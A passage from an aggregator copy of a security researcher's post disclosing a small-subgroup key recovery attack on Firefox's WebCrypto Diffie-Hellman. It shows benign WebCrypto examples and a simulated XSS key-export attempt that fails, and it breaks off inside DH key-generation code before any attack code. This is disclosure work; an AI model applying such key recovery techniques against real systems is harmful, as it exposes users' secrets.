<!DOCTYPE html>
<html lang="en">
<head>
    <title>linksfor.dev(s)</title>
    <meta charset="utf-8">
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="grid">
        <h1>
                <span style="cursor: default" title="linksfor.dev(s) has been running for 1 year! :partypopper:">ðŸŽ‰</span>
<a href="/" style="color:inherit">linksfor.dev(s)</a>
        </h1>
        <div class="readable">
        <h1>The Curious Case of WebCrypto Diffie-Hellman on Firefox -   Small Subgroups Key Recovery Attack on DH</h1>
        <p>
by Share <br/>Reading time: 19-24 minutes        </p>
        <p><a href="http://blog.intothesymmetry.com/2020/01/the-curious-case-of-webcrypto-diffie.html">http://blog.intothesymmetry.com/2020/01/the-curious-case-of-webcrypto-diffie.html</a></p>
        <hr/>
<div id="readability-page-1" class="page"><div>
<h3>
The Curious Case of WebCrypto Diffie-Hellman on Firefox -   Small Subgroups Key Recovery Attack on DH
</h3>
</div><div>
<div id="post-body-7432388175917295566">
<div>
<p><b>tl;dr </b>Mozilla Firefox prior to version 72 suffers from <i>Small Subgroups Key Recovery Attack on DH</i> in the <i><b>WebCrypto</b></i>'s API. The Firefox's team fixed the issue </p><u><b>r</b><b>emoving completely</b></u><p> support for DH over finite fields (that is not in the WebCrypto standard). If you find this interesting read further below.</p></div>

<div><p>
In this blog post I assume you are already knowledgeable about Diffie-Hellman over finite fields and related attacks. If not I recommend to read any cryptography book that covers public key cryptography. Here is a really cool simple explanation by <a href="https://twitter.com/cryptodavidw">David Wong</a>:</p>
<p> 
If you want more details about <i><b>Small Subgroups Key Recovery Attack on DH</b></i> I covered some background in one of my previous post (<a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701)</a> ). There is also an <a href="https://eprint.iacr.org/2016/995.pdf">academic pape</a><a href="https://www.blogger.com/null">r</a> where we examine the issue with some more rigors. If you want to read the original attack I recommend the <a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.44.5296">Lim-Lee</a>'s seminal paper.</p></div>

<p>
The <a href="https://www.w3.org/TR/WebCryptoAPI/">Web Cryptography API</a> is a specification that describes a JavaScript API for performing basic
        cryptographic operations in web applications. This was always a controversial topic between people in the crypto arena and you can read some eminent opinion in the wild e.g. :</p>
<ul>
<li><a href="https://twitter.com/tqbf">Thomas Ptacek</a> initial post that was totally against the idea idea of having cryptography in browsers: <a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2011/august/javascript-cryptography-considered-harmful/">Javascript Cryptography Considered Harmful</a></li>
<li><a href="https://twitter.com/tony">Tony Arcieri </a>updated view (still skeptical though): <a href="https://tonyarcieri.com/whats-wrong-with-webcrypto">Whatâ€™s wrong with in-browser cryptography? </a></li>
<li><a href="https://twitter.com/XorNinja">Thai Duong </a>more optimistic view in&nbsp;<a href="https://vnhacker.blogspot.com/2014/06/why-javascript-crypto-is-useful.html"> Javascript Crypto Is Useful</a></li>
</ul>

<p>
Said that this post is not about the usefulness of WebCrypto so I'll spare you my opinion on the topic :p</p>

<p>
Ok you might say, now we have three paragraphs about WebCrypto but how is this looking like? Luckily the good <a href="https://github.com/diafygi">diafygi</a> comes to the rescue with a <a href="https://diafygi.github.io/webcrypto-examples/">full page of examples</a></p>

<table><tbody>
<tr><td><a href="https://1.bp.blogspot.com/-RKsVLpqIoAQ/Xg9Pa5KHjmI/AAAAAAAADWU/-M7FasHUXu8u5SxyRvdMH-33qKWkR6RpACLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-03%2Bat%2B3.27.32%2BPM.png" imageanchor="1"><img data-original-height="759" data-original-width="1250" height="388" src="https://1.bp.blogspot.com/-RKsVLpqIoAQ/Xg9Pa5KHjmI/AAAAAAAADWU/-M7FasHUXu8u5SxyRvdMH-33qKWkR6RpACLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-03%2Bat%2B3.27.32%2BPM.png" width="640"></a></td></tr>
<tr><td><b>WebCrypto API Live table</b></td></tr>
</tbody></table>

<p>
So how can I encrypt a message using WebCrypto API? <a href="https://github.com/diafygi/webcrypto-examples/#aes-gcm">Here is an example</a> from that page:</p>
<div id="gist100366052">
    <div>
      <div>
        <div>
  <div id="file-aes-gcm-webcrypto-js">
    

  <div itemprop="text">
      
<table data-tab-size="8">
      <tbody><tr>
        <td id="file-aes-gcm-webcrypto-js-L1" data-line-number="1"></td>
        <td id="file-aes-gcm-webcrypto-js-LC1"><span>//https://github.com/diafygi/webcrypto-examples</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L2" data-line-number="2"></td>
        <td id="file-aes-gcm-webcrypto-js-LC2"><span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>encrypt</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L3" data-line-number="3"></td>
        <td id="file-aes-gcm-webcrypto-js-LC3">    <span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L4" data-line-number="4"></td>
        <td id="file-aes-gcm-webcrypto-js-LC4">        <span>name</span>: <span>"AES-GCM"</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L5" data-line-number="5"></td>
        <td id="file-aes-gcm-webcrypto-js-LC5">
</td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L6" data-line-number="6"></td>
        <td id="file-aes-gcm-webcrypto-js-LC6">        <span>//Don't re-use initialization vectors!</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L7" data-line-number="7"></td>
        <td id="file-aes-gcm-webcrypto-js-LC7">        <span>//Always generate a new iv every time your encrypt!</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L8" data-line-number="8"></td>
        <td id="file-aes-gcm-webcrypto-js-LC8">        <span>//Recommended to use 12 bytes length</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L9" data-line-number="9"></td>
        <td id="file-aes-gcm-webcrypto-js-LC9">        <span>iv</span>: <span>window</span><span>.</span><span>crypto</span><span>.</span><span>getRandomValues</span><span>(</span><span>new</span> <span>Uint8Array</span><span>(</span><span>12</span><span>)</span><span>)</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L10" data-line-number="10"></td>
        <td id="file-aes-gcm-webcrypto-js-LC10">
</td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L11" data-line-number="11"></td>
        <td id="file-aes-gcm-webcrypto-js-LC11">        <span>//Additional authentication data (optional)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L12" data-line-number="12"></td>
        <td id="file-aes-gcm-webcrypto-js-LC12">        <span>additionalData</span>: <span>ArrayBuffer</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L13" data-line-number="13"></td>
        <td id="file-aes-gcm-webcrypto-js-LC13">
</td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L14" data-line-number="14"></td>
        <td id="file-aes-gcm-webcrypto-js-LC14">        <span>//Tag length (optional)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L15" data-line-number="15"></td>
        <td id="file-aes-gcm-webcrypto-js-LC15">        <span>tagLength</span>: <span>128</span><span>,</span> <span>//can be 32, 64, 96, 104, 112, 120 or 128 (default)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L16" data-line-number="16"></td>
        <td id="file-aes-gcm-webcrypto-js-LC16">    <span>}</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L17" data-line-number="17"></td>
        <td id="file-aes-gcm-webcrypto-js-LC17">    <span>key</span><span>,</span> <span>//from generateKey or importKey above</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L18" data-line-number="18"></td>
        <td id="file-aes-gcm-webcrypto-js-LC18">    <span>data</span> <span>//ArrayBuffer of data you want to encrypt</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L19" data-line-number="19"></td>
        <td id="file-aes-gcm-webcrypto-js-LC19"><span>)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L20" data-line-number="20"></td>
        <td id="file-aes-gcm-webcrypto-js-LC20"><span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>encrypted</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L21" data-line-number="21"></td>
        <td id="file-aes-gcm-webcrypto-js-LC21">    <span>//returns an ArrayBuffer containing the encrypted data</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L22" data-line-number="22"></td>
        <td id="file-aes-gcm-webcrypto-js-LC22">    <span>console</span><span>.</span><span>log</span><span>(</span><span>new</span> <span>Uint8Array</span><span>(</span><span>encrypted</span><span>)</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L23" data-line-number="23"></td>
        <td id="file-aes-gcm-webcrypto-js-LC23"><span>}</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L24" data-line-number="24"></td>
        <td id="file-aes-gcm-webcrypto-js-LC24"><span>.</span><span>catch</span><span>(</span><span>function</span><span>(</span><span>err</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L25" data-line-number="25"></td>
        <td id="file-aes-gcm-webcrypto-js-LC25">    <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-js-L26" data-line-number="26"></td>
        <td id="file-aes-gcm-webcrypto-js-LC26"><span>}</span><span>)</span><span>;</span></td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>


<br>
<div><p>
Really simple no? In a similar way of encrypting using <b><i>AES-GCM </i></b>the WebCrypto API provides you simple ways for using <i><b>HMAC</b></i>, <i><b>RSA</b></i>, <i><b>ECDSA</b></i>, <i><b>ECDH</b></i> and so on... Beautiful. So how popular is this API? Luckily we can even have an answer for it thanks to telemetry (and <a href="https://twitter.com/_franziskus_">Franziskus Kiefer</a> that showed it to me):</p><table><tbody>
<tr><td><a href="https://1.bp.blogspot.com/-1dB-BPHnQ4w/Xg9dOyKzuAI/AAAAAAAADWg/fLmWrMte6oskYvZS23Z7E_b9tXqUSo4vQCLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-03%2Bat%2B4.26.04%2BPM.png" imageanchor="1"><img data-original-height="1032" data-original-width="1274" height="518" src="https://1.bp.blogspot.com/-1dB-BPHnQ4w/Xg9dOyKzuAI/AAAAAAAADWg/fLmWrMte6oskYvZS23Z7E_b9tXqUSo4vQCLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-03%2Bat%2B4.26.04%2BPM.png" width="640"></a></td></tr>
<tr><td><b>WebCrypto Firefox Telemetry</b></td></tr>
</tbody></table><p>
The graph above is taken directly from <a href="https://telemetry.mozilla.org/new-pipeline/dist.html#!cumulative=0&amp;end_date=2019-12-05&amp;include_spill=0&amp;keys=__none__!__none__!__none__&amp;max_channel_version=nightly%252F72&amp;measure=WEBCRYPTO_ALG&amp;min_channel_version=nightly%252F62&amp;processType=*&amp;product=Firefox&amp;sanitize=0&amp;sort_by_value=0&amp;sort_keys=submissions&amp;start_date=2019-10-21&amp;table=0&amp;trim=1&amp;use_submission_date=0">Firefox's telemetry</a> but what are those weird numbers? Well in order to make some sense out of it you need to look at <a href="https://searchfox.org/mozilla-central/source/dom/crypto/WebCryptoTask.cpp#59">the source code</a>!!! :</p><p><a href="https://1.bp.blogspot.com/-TLqjsnJLDuo/Xg9d-pkQT2I/AAAAAAAADWo/-RNxWMexxRcwIGHYQeBQxrI1NcjFXA-swCLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-03%2Bat%2B4.29.45%2BPM.png" imageanchor="1"><img data-original-height="537" data-original-width="481" height="640" src="https://1.bp.blogspot.com/-TLqjsnJLDuo/Xg9d-pkQT2I/AAAAAAAADWo/-RNxWMexxRcwIGHYQeBQxrI1NcjFXA-swCLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-03%2Bat%2B4.29.45%2BPM.png" width="572"></a></p><p>
So for some weird reason <i><b>AES CBC </b></i>is the most used method in Firefox nightly 72 followed by the two <i><b>SHA</b></i> methods.</p><p>
There are many places in the web where WebCrypto security is discussed in depth. Some pointers are <a href="https://twitter.com/harryhalpin">Harry Halpin</a> slides delivered at <a href="https://csrc.nist.gov/csrc/media/events/ssr-2016-security-standardisation-research/documents/presentation-mon-halpin.pdf">Security Standardization Research Conference</a> or <a href="https://twitter.com/ttaubert">Tim Taubert</a> talk at <a href="https://2014.jsconf.eu/speakers/tim-taubert-keeping-secrets-with-javascript-an-introduction-to-the-webcrypto-api.html">JS Conf</a>.&nbsp; Said that, this is the way a <span><span><a href="https://twitter.com/jurajsomorovsky">Juraj Somorovsky</a> </span></span>(a colleague of mine at <a href="https://www.nds.ruhr-uni-bochum.de/chair/news/">Ruhr-UniversitÃ¤t Bochum</a>) described it and I found the parallelism great:</p><p><a href="https://1.bp.blogspot.com/-OrF1nT-secY/XhL_iu4DPTI/AAAAAAAADW4/NzAl0kMsAaApxnySrzexOvsjsetNF0zOQCLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-06%2Bat%2B9.41.24%2BAM.png" imageanchor="1"><img data-original-height="332" data-original-width="928" height="228" src="https://1.bp.blogspot.com/-OrF1nT-secY/XhL_iu4DPTI/AAAAAAAADW4/NzAl0kMsAaApxnySrzexOvsjsetNF0zOQCLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-06%2Bat%2B9.41.24%2BAM.png" width="640"></a></p><p>
So what does it mean? Well basically when a cryptographic key is <i>created/imported</i>, there is an <span><b>extractable</b> </span>property that if set to <b><span>false</span> </b>will not allow (as the property name hints) the extraction of raw key material (aka the value of the key).&nbsp; So even if an attacker will be able to gain </p><u><b>XSS privilege he will not be able to steal the key</b></u><p>!!. See the&nbsp; example below :</p><div id="gist100409073">
    <div>
      <div>
        <div>
  <div id="file-aes-gcm-webcrypto-html">
    

  <div itemprop="text">
      
<table data-tab-size="8">
      <tbody><tr>
        <td id="file-aes-gcm-webcrypto-html-L1" data-line-number="1"></td>
        <td id="file-aes-gcm-webcrypto-html-LC1"><span>&lt;</span><span>script</span><span>&gt;</span>  </td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L2" data-line-number="2"></td>
        <td id="file-aes-gcm-webcrypto-html-LC2"><span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>generateKey</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L3" data-line-number="3"></td>
        <td id="file-aes-gcm-webcrypto-html-LC3">    <span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L4" data-line-number="4"></td>
        <td id="file-aes-gcm-webcrypto-html-LC4">        <span>name</span>: <span>"AES-GCM"</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L5" data-line-number="5"></td>
        <td id="file-aes-gcm-webcrypto-html-LC5">        <span>length</span>: <span>256</span><span>,</span> <span>//can be  128, 192, or 256</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L6" data-line-number="6"></td>
        <td id="file-aes-gcm-webcrypto-html-LC6">    <span>}</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L7" data-line-number="7"></td>
        <td id="file-aes-gcm-webcrypto-html-LC7">    <span>false</span><span>,</span> <span>//whether the key is extractable (i.e. can be used in exportKey)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L8" data-line-number="8"></td>
        <td id="file-aes-gcm-webcrypto-html-LC8">    <span>[</span><span>"encrypt"</span><span>,</span> <span>"decrypt"</span><span>]</span> <span>//can "encrypt", "decrypt", "wrapKey", or "unwrapKey"</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L9" data-line-number="9"></td>
        <td id="file-aes-gcm-webcrypto-html-LC9"><span>)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L10" data-line-number="10"></td>
        <td id="file-aes-gcm-webcrypto-html-LC10"><span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>key</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L11" data-line-number="11"></td>
        <td id="file-aes-gcm-webcrypto-html-LC11">    <span>//returns a key object</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L12" data-line-number="12"></td>
        <td id="file-aes-gcm-webcrypto-html-LC12">    <span>console</span><span>.</span><span>log</span><span>(</span><span>key</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L13" data-line-number="13"></td>
        <td id="file-aes-gcm-webcrypto-html-LC13"><span>}</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L14" data-line-number="14"></td>
        <td id="file-aes-gcm-webcrypto-html-LC14"><span>.</span><span>catch</span><span>(</span><span>function</span><span>(</span><span>err</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L15" data-line-number="15"></td>
        <td id="file-aes-gcm-webcrypto-html-LC15">    <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L16" data-line-number="16"></td>
        <td id="file-aes-gcm-webcrypto-html-LC16"><span>}</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L17" data-line-number="17"></td>
        <td id="file-aes-gcm-webcrypto-html-LC17"><span>&lt;/</span><span>script</span><span>&gt;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L18" data-line-number="18"></td>
        <td id="file-aes-gcm-webcrypto-html-LC18"><span>&lt;</span><span>script</span><span>&gt;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L19" data-line-number="19"></td>
        <td id="file-aes-gcm-webcrypto-html-LC19"><span>//XSS here</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L20" data-line-number="20"></td>
        <td id="file-aes-gcm-webcrypto-html-LC20"><span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>exportKey</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L21" data-line-number="21"></td>
        <td id="file-aes-gcm-webcrypto-html-LC21">    <span>"jwk"</span><span>,</span> <span>//can be "jwk" or "raw"</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L22" data-line-number="22"></td>
        <td id="file-aes-gcm-webcrypto-html-LC22">    <span>key</span> <span>//extractable must be true</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L23" data-line-number="23"></td>
        <td id="file-aes-gcm-webcrypto-html-LC23"><span>)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L24" data-line-number="24"></td>
        <td id="file-aes-gcm-webcrypto-html-LC24"><span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>keydata</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L25" data-line-number="25"></td>
        <td id="file-aes-gcm-webcrypto-html-LC25">    <span>//returns the exported key data</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L26" data-line-number="26"></td>
        <td id="file-aes-gcm-webcrypto-html-LC26">    <span>console</span><span>.</span><span>log</span><span>(</span><span>keydata</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L27" data-line-number="27"></td>
        <td id="file-aes-gcm-webcrypto-html-LC27"><span>}</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L28" data-line-number="28"></td>
        <td id="file-aes-gcm-webcrypto-html-LC28"><span>.</span><span>catch</span><span>(</span><span>function</span><span>(</span><span>err</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L29" data-line-number="29"></td>
        <td id="file-aes-gcm-webcrypto-html-LC29">    <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L30" data-line-number="30"></td>
        <td id="file-aes-gcm-webcrypto-html-LC30"><span>}</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-aes-gcm-webcrypto-html-L31" data-line-number="31"></td>
        <td id="file-aes-gcm-webcrypto-html-LC31"><span>&lt;/</span><span>script</span><span>&gt;</span></td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>

<p><span>In this example an exception is caught&nbsp; and logged at <span>line 29</span>:</span><br>
<b><span><span><span><span><span data-link-actor-id="server0.conn0.child1/obj51">DOMException: "A parameter or an operation is not supported by the underlying object"</span></span></span></span></span></b><br>
<span><span><span><span><span data-link-actor-id="server0.conn0.child1/obj51">The reason is because the key is declared as not extractable at <span>line 7<span>.</span></span></span></span></span></span></span></p><h2>
<span>
</span><span>WebCrypto DH</span></h2><p>
So we arrived to talk about <a href="https://github.com/diafygi/webcrypto-examples/#dh">WebCrypto DH</a>. Let's go directly to the point. <i><b>Diffie-Hellman over finite fields </b></i>(DH from now on) is not in the WebCrypto specification and is (until today) implemented only by Mozilla Firefox (for the record from <b><i>Elliptic Curve Diffie-Hellman -ECDH</i></b> is instead<a href="https://www.w3.org/TR/WebCryptoAPI/#ecdh"><b> part of the specification</b></a>). This was argument of&nbsp; a <a href="https://lists.w3.org/Archives/Public/public-webcrypto/2015Oct/0000.html">little debate during the specification development</a> but at the end <a href="https://twitter.com/sleevi_">Ryan Sleevi</a> made <a href="https://lists.w3.org/Archives/Public/public-webcrypto/2015Oct/0004.html">the point</a> (BTW Google Chrome <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=438391">never implemented it</a>)<br>
For some reason Mozilla Firefox decided to keep the implementation of&nbsp; <b><i>WebCrypto DH</i></b>. Now a typical potential<b><i> WebCrypto DH</i></b> scenario usage is the following:</p><ol>
<li><i>Alice</i> <b>generates</b> a DH <b>key pair</b> and send to <i>Bob&nbsp;</i></li>
<div id="gist100412980">
    <div>
      <div>
        <div>
  <div id="file-dh-keypair-js">
    

  <div itemprop="text">
      
<table data-tab-size="8">
      <tbody><tr>
        <td id="file-dh-keypair-js-L1" data-line-number="1"></td>
        <td id="file-dh-keypair-js-LC1">
</td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L2" data-line-number="2"></td>
        <td id="file-dh-keypair-js-LC2"><span>/*</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L3" data-line-number="3"></td>
        <td id="file-dh-keypair-js-LC3"><span> * Arguments: None</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L4" data-line-number="4"></td>
        <td id="file-dh-keypair-js-LC4"><span> *</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L5" data-line-number="5"></td>
        <td id="file-dh-keypair-js-LC5"><span> * Returns: Promise resolving to:</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L6" data-line-number="6"></td>
        <td id="file-dh-keypair-js-LC6"><span> *   {</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L7" data-line-number="7"></td>
        <td id="file-dh-keypair-js-LC7"><span> *     privateKey: CryptoKey,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L8" data-line-number="8"></td>
        <td id="file-dh-keypair-js-LC8"><span> *     publicKey: CryptoKey,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L9" data-line-number="9"></td>
        <td id="file-dh-keypair-js-LC9"><span> *   }</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L10" data-line-number="10"></td>
        <td id="file-dh-keypair-js-LC10"><span> */</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L11" data-line-number="11"></td>
        <td id="file-dh-keypair-js-LC11"><span>async</span> <span>function</span> <span>newKeyPair</span><span>(</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L12" data-line-number="12"></td>
        <td id="file-dh-keypair-js-LC12">  <span>const</span> <span>kp</span> <span>=</span>  <span>await</span> <span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>generateKey</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L13" data-line-number="13"></td>
        <td id="file-dh-keypair-js-LC13">    <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L14" data-line-number="14"></td>
        <td id="file-dh-keypair-js-LC14">        <span>name</span>: <span>"DH"</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L15" data-line-number="15"></td>
        <td id="file-dh-keypair-js-LC15">        <span>//NOTE: THIS IS A SMALL PRIME FOR TESTING ONLY! DO NOT USE IT FOR REAL!</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L16" data-line-number="16"></td>
        <td id="file-dh-keypair-js-LC16">        <span>//See http://datatracker.ietf.org/doc/rfc3526/ for better primes</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L17" data-line-number="17"></td>
        <td id="file-dh-keypair-js-LC17">        <span>prime</span>: <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L18" data-line-number="18"></td>
        <td id="file-dh-keypair-js-LC18">            <span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>201</span><span>,</span><span>15</span><span>,</span><span>218</span><span>,</span><span>162</span><span>,</span><span>33</span><span>,</span><span>104</span><span>,</span><span>194</span><span>,</span><span>52</span><span>,</span><span>196</span><span>,</span><span>198</span><span>,</span><span>98</span><span>,</span><span>139</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L19" data-line-number="19"></td>
        <td id="file-dh-keypair-js-LC19">            <span>128</span><span>,</span><span>220</span><span>,</span><span>28</span><span>,</span><span>209</span><span>,</span><span>41</span><span>,</span><span>2</span><span>,</span><span>78</span><span>,</span><span>8</span><span>,</span><span>138</span><span>,</span><span>103</span><span>,</span><span>204</span><span>,</span><span>116</span><span>,</span><span>2</span><span>,</span><span>11</span><span>,</span><span>190</span><span>,</span><span>166</span><span>,</span><span>59</span><span>,</span><span>19</span><span>,</span><span>155</span><span>,</span><span>34</span><span>,</span><span>81</span><span>,</span><span>74</span><span>,</span><span>8</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L20" data-line-number="20"></td>
        <td id="file-dh-keypair-js-LC20">            <span>121</span><span>,</span><span>142</span><span>,</span><span>52</span><span>,</span><span>4</span><span>,</span><span>221</span><span>,</span><span>239</span><span>,</span><span>149</span><span>,</span><span>25</span><span>,</span><span>179</span><span>,</span><span>205</span><span>,</span><span>58</span><span>,</span><span>67</span><span>,</span><span>27</span><span>,</span><span>48</span><span>,</span><span>43</span><span>,</span><span>10</span><span>,</span><span>109</span><span>,</span><span>242</span><span>,</span><span>95</span><span>,</span><span>20</span><span>,</span><span>55</span><span>,</span><span>79</span><span>,</span><span>225</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L21" data-line-number="21"></td>
        <td id="file-dh-keypair-js-LC21">            <span>53</span><span>,</span><span>109</span><span>,</span><span>109</span><span>,</span><span>81</span><span>,</span><span>194</span><span>,</span><span>69</span><span>,</span><span>228</span><span>,</span><span>133</span><span>,</span><span>181</span><span>,</span><span>118</span><span>,</span><span>98</span><span>,</span><span>94</span><span>,</span><span>126</span><span>,</span><span>198</span><span>,</span><span>244</span><span>,</span><span>76</span><span>,</span><span>66</span><span>,</span><span>233</span><span>,</span><span>166</span><span>,</span><span>55</span><span>,</span><span>237</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L22" data-line-number="22"></td>
        <td id="file-dh-keypair-js-LC22">            <span>107</span><span>,</span><span>11</span><span>,</span><span>255</span><span>,</span><span>92</span><span>,</span><span>182</span><span>,</span><span>244</span><span>,</span><span>6</span><span>,</span><span>183</span><span>,</span><span>237</span><span>,</span><span>238</span><span>,</span><span>56</span><span>,</span><span>107</span><span>,</span><span>251</span><span>,</span><span>90</span><span>,</span><span>137</span><span>,</span><span>159</span><span>,</span><span>165</span><span>,</span><span>174</span><span>,</span><span>159</span><span>,</span><span>36</span><span>,</span><span>17</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L23" data-line-number="23"></td>
